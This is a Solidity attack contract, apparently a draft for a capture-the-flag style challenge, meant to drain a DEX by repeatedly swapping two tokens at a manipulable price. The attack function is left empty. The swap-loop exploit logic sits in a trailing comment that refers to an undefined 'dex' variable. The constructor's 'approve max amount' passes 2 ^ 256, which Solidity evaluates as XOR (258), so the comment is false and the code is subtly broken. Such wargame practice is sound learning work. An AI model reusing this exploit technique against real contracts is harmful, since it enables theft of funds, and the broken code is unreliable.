// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./22-dex.sol";

contract Attack22 {
    Dex _target;
    address public token1;
    address public token2;
    
    constructor(address _targetAddress) {
        _target = Dex(_targetAddress);
        _target.approve(address(_target), 2 ^ 256); // approve max amount
    }

    function attack() public {
        address from = token1;
        address to = token2;
        // 
    }

    receive() external payable {}
}

// Remember:  we need to approve the tokens for swap
// and THEN perform the swaps

/*
    from = (from == token1) ? token2 : token1;
    to = (to == token1) ? token2 : token1;

    // how much we want to swap of token from (our entire balance, except for last iteration)
    uint256 amount = dex.balanceOf(from, address(this));

    // how much we will receive from the to token
    uint256 amountReceived = dex.getSwapPrice(from, to, amount);
    
    // for the last iteration, if we swap our entire balance of token from the swap will revert 
    // since the dex doesn't have enough of token to we need to determine how much to send to 
    // empty the other token balance
    
    if (amountReceived > 110) {
        amount = (amount * 110) / amountReceived; // swap amount to get the whole balance of the other token
    }
    
    dex.swap(from, to, amount);
*/